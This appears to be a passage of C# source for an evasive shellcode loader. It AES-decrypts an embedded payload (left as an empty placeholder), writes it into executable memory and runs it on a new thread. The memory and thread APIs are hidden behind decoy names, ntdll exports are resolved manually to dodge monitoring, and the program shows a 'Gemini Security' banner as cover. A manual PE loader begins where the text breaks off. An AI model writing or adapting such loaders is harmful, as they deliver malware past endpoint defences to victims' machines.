using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.CodeDom.Compiler;
using System.Diagnostics;

public class Program
{

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main(string[] args)
    {
        Console.WriteLine("Welcome to Gemini Security");
        byte[] passwordBytes = Encoding.UTF8.GetBytes("pass");
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
        byte[] aesshellcode = new byte[0] { };
        byte[] shellcode = AES_Decrypt(aesshellcode, passwordBytes);

        IntPtr codeAddr = New.OtherAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = New.CreateCandy(IntPtr.Zero, 0, codeAddr, parameter, 0, IntPtr.Zero);
        New.WaitForCandy(threadHandle, 0xFFFFFFFF);
        return;
    }

    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();
                }
                decryptedBytes = ms.ToArray();
            }
        }

        return decryptedBytes;
    }

    public class Gen
    {
        public static object HowToLiveALife(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }

        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            N.UNICODE_STRING uModuleName = new N.UNICODE_STRING();
            N2.RtlInitUnicodeString(ref uModuleName, DLLPath);
            IntPtr hModule = IntPtr.Zero;
            N.NTSTATUS CallResult = N2.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != N.NTSTATUS.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }
            return hModule;
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static string GetAPIHash(string APIName, long Key)
        {
            byte[] data = Encoding.UTF8.GetBytes(APIName.ToLower());
            byte[] kbytes = BitConverter.GetBytes(Key);
            using (HMACMD5 hmac = new HMACMD5(kbytes))
            {
                byte[] bHash = hmac.ComputeHash(data);
                return BitConverter.ToString(bHash).Replace("-", "");
            }
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {

                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }


                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));


                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {

                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {

                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
    }
    public class N2
    {

        public static void RtlInitUnicodeString(ref N.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {

            object[] funcargs =
            {
                DestinationString, SourceString
            };

            Gen.HowToLiveALife(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);


            DestinationString = (N.UNICODE_STRING)funcargs[0];
        }
        public static N.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref N.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {

            object[] funcargs =
            {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };
            N.NTSTATUS retValue = (N.NTSTATUS)Gen.HowToLiveALife(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);
            ModuleHandle = (IntPtr)funcargs[3];
            return retValue;
        }

        public static void RtlZeroMemory(IntPtr Destination, int Length)
        {

            object[] funcargs =
            {
                Destination, Length
            };

            Gen.HowToLiveALife(@"ntdll.dll", @"RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref funcargs);
        }

        public struct DELEGATES
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlInitUnicodeString(
               ref N.UNICODE_STRING DestinationString,
               [MarshalAs(UnmanagedType.LPWStr)]
                string SourceString);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 LdrLoadDll(
                IntPtr PathToFile,
            UInt32 dwFlags,
                ref N.UNICODE_STRING ModuleFileName,
                ref IntPtr ModuleHandle);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 NtQueryInformationProcess(
                IntPtr processHandle,
                N.PROCESSINFOCLASS processInformationClass,
                IntPtr processInformation,
                int processInformationLength,
                ref UInt32 returnLength);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlZeroMemory(
            IntPtr Destination,
            int length);

        }
    }

    public static class N
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ANSI_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public int InheritedFromUniqueProcessId;
            public int Size
            {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
            }
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public IntPtr Status;
            public IntPtr Information;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            ulong ControlWord;
            ulong StatusWord;
            ulong TagWord;
            ulong ErrorOffset;
            ulong ErrorSelector;
            ulong DataOffset;
            ulong DataSelector;
            byte[] RegisterArea;
            ulong Cr0NpxState;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct STACKINFO
        {
            ulong StackBase;
            ulong StackLimit;
            ulong StackCommit;
            ulong StackCommitMax;
            ulong StackReserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct THREADCONTEXT
        {
            ulong ContextFlags;
            ulong Dr0;
            ulong Dr1;
            ulong Dr2;
            ulong Dr3;
            ulong Dr6;
            ulong Dr7;
            FLOATING_SAVE_AREA FloatSave;
            ulong SegGs;
            ulong SegFs;
            ulong SegEs;
            ulong SegDs;
            ulong Edi;
            ulong Esi;
            ulong Ebx;
            ulong Edx;
            ulong Ecx;
            ulong Eax;
            ulong Ebp;
            ulong Eip;
            ulong SegCs;
            ulong EFlags;
            ulong Esp;
            ulong SegSs;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct OSVERSIONINFOEX
        {
            public uint OSVersionInfoSize;
            public uint MajorVersion;
            public uint MinorVersion;
            public uint BuildNumber;
            public uint PlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string CSDVersion;
            public ushort ServicePackMajor;
            public ushort ServicePackMinor;
            public ushort SuiteMask;
            public byte ProductType;
            public byte Reserved;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }
        public enum MEMORYINFOCLASS : int
        {
            MemoryBasicInformation = 0,
            MemoryWorkingSetList,
            MemorySectionName,
            MemoryBasicVlmInformation
        }
        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0,
            ProcessQuotaLimits,
            ProcessIoCounters,
            ProcessVmCounters,
            ProcessTimes,
            ProcessBasePriority,
            ProcessRaisePriority,
            ProcessDebugPort,
            ProcessExceptionPort,
            ProcessAccessToken,
            ProcessLdtInformation,
            ProcessLdtSize,
            ProcessDefaultHardErrorMode,
            ProcessIoPortHandlers,
            ProcessPooledUsageAndLimits,
            ProcessWorkingSetWatch,
            ProcessUserModeIOPL,
            ProcessEnableAlignmentFaultFixup,
            ProcessPriorityClass,
            ProcessWx86Information,
            ProcessHandleCount,
            ProcessAffinityMask,
            ProcessPriorityBoost,
            ProcessDeviceMap,
            ProcessSessionInformation,
            ProcessForegroundInformation,
            ProcessWow64Information,
            ProcessImageFileName,
            ProcessLUIDDeviceMapsEnabled,
            ProcessBreakOnTermination,
            ProcessDebugObjectHandle,
            ProcessDebugFlags,
            ProcessHandleTracing,
            ProcessIoPriority,
            ProcessExecuteFlags,
            ProcessResourceManagement,
            ProcessCookie,
            ProcessImageInformation,
            ProcessCycleTime,
            ProcessPagePriority,
            ProcessInstrumentationCallback,
            ProcessThreadStackAllocation,
            ProcessWorkingSetWatchEx,
            ProcessImageFileNameWin32,
            ProcessImageFileMapping,
            ProcessAffinityUpdateMode,
            ProcessMemoryAllocationMode,
            ProcessGroupInformation,
            ProcessTokenVirtualizationEnabled,
            ProcessConsoleHostProcess,
            ProcessWindowInformation,
            ProcessHandleInformation,
            ProcessMitigationPolicy,
            ProcessDynamicFunctionTableInformation,
            ProcessHandleCheckingMode,
            ProcessKeepAliveCount,
            ProcessRevokeFileHandles,
            MaxProcessInfoClass
        };
        public enum NT_CREATION_FLAGS : ulong
        {
            CREATE_SUSPENDED = 0x00000001,
            SKIP_THREAD_ATTACH = 0x00000002,
            HIDE_FROM_DEBUGGER = 0x00000004,
            HAS_SECURITY_DESCRIPTOR = 0x00000010,
            ACCESS_CHECK_IN_TARGET = 0x00000020,
            INITIAL_THREAD = 0x00000080
        }
        public enum NTSTATUS : uint
        {
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,
            MaximumNtStatus = 0xffffffff
        }
    }

    public class P
    {
        [Flags]
        public enum DataSectionFlags : uint
        {
            TYPE_NO_PAD = 0x00000008,
            CNT_CODE = 0x00000020,
            CNT_INITIALIZED_DATA = 0x00000040,
            CNT_UNINITIALIZED_DATA = 0x00000080,
            LNK_INFO = 0x00000200,
            LNK_REMOVE = 0x00000800,
            LNK_COMDAT = 0x00001000,
            NO_DEFER_SPEC_EXC = 0x00004000,
            GPREL = 0x00008000,
            MEM_FARDATA = 0x00008000,
            MEM_PURGEABLE = 0x00020000,
            MEM_16BIT = 0x00020000,
            MEM_LOCKED = 0x00040000,
            MEM_PRELOAD = 0x00080000,
            ALIGN_1BYTES = 0x00100000,
            ALIGN_2BYTES = 0x00200000,
            ALIGN_4BYTES = 0x00300000,
            ALIGN_8BYTES = 0x00400000,
            ALIGN_16BYTES = 0x00500000,
            ALIGN_32BYTES = 0x00600000,
            ALIGN_64BYTES = 0x00700000,
            ALIGN_128BYTES = 0x00800000,
            ALIGN_256BYTES = 0x00900000,
            ALIGN_512BYTES = 0x00A00000,
            ALIGN_1024BYTES = 0x00B00000,
            ALIGN_2048BYTES = 0x00C00000,
            ALIGN_4096BYTES = 0x00D00000,
            ALIGN_8192BYTES = 0x00E00000,
            ALIGN_MASK = 0x00F00000,
            LNK_NRELOC_OVFL = 0x01000000,
            MEM_DISCARDABLE = 0x02000000,
            MEM_NOT_CACHED = 0x04000000,
            MEM_NOT_PAGED = 0x08000000,
            MEM_SHARED = 0x10000000,
            MEM_EXECUTE = 0x20000000,
            MEM_READ = 0x40000000,
            MEM_WRITE = 0x80000000
        }

        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }

        public IMAGE_FILE_HEADER FileHeader { get; private set; }


        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32 { get; private set; }


        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64 { get; private set; }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders { get; private set; }

        public byte[] PEBytes { get; private set; }


        private IMAGE_DOS_HEADER dosHeader;


        public const UInt32 DLL_PROCESS_DETACH = 0;
        public const UInt32 DLL_PROCESS_ATTACH = 1;
        public const UInt32 DLL_THREAD_ATTACH = 2;
        public const UInt32 DLL_THREAD_DETACH = 3;


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DllMain(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

        private static IntPtr codebase;





        public P(byte[] PEBytes)
        {

            using (MemoryStream stream = new MemoryStream(PEBytes, 0, PEBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);


                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                FileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    OptionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
